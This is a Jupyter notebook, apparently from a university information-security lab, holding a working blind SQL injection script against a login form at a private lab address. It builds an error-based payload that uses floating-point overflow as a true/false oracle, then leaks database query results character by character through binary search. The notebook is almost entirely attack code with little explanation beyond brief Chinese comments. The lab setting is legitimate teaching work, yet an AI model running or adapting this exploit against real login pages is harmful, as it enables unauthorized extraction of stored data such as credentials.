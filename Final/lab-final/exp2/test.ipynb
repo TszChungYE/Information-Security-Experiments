{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "# 盲注基本参数\n",
    "payload_template = '2\" + (ascii(substr(({}),{},1))<{})*1e200*1e200*1e200#'\n",
    "login_url = \"http://192.168.2.2/api/account/login.php\"\n",
    "\n",
    "# 利用 requests 包模拟提交请求\n",
    "def login(username, password):\n",
    "    return requests.post(login_url, {\n",
    "        \"username\": username,\n",
    "        \"password\": password\n",
    "    })\n",
    "    \n",
    "# 判断是否猜测正确\n",
    "def test(payload):\n",
    "    res = login(payload, \"22\").json()\n",
    "    return res[\"msg\"] == 'Cannot read data!'\n",
    "    \n",
    "# 利用二分查找加快判断过程\n",
    "def leak_char(query, index):\n",
    "    left, right = 0, 255\n",
    "    while left < right - 1:\n",
    "        mid = (left + right) // 2\n",
    "        payload = payload_template.format(query, index, mid)\n",
    "        if test(payload):\n",
    "            right = mid\n",
    "        else:\n",
    "            left = mid\n",
    "    return left"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'2\" + (ascii(substr((1),2,1))<3)*1e200*1e200*1e200#'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload_template.format(1, 2, 3)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "cv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.14"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
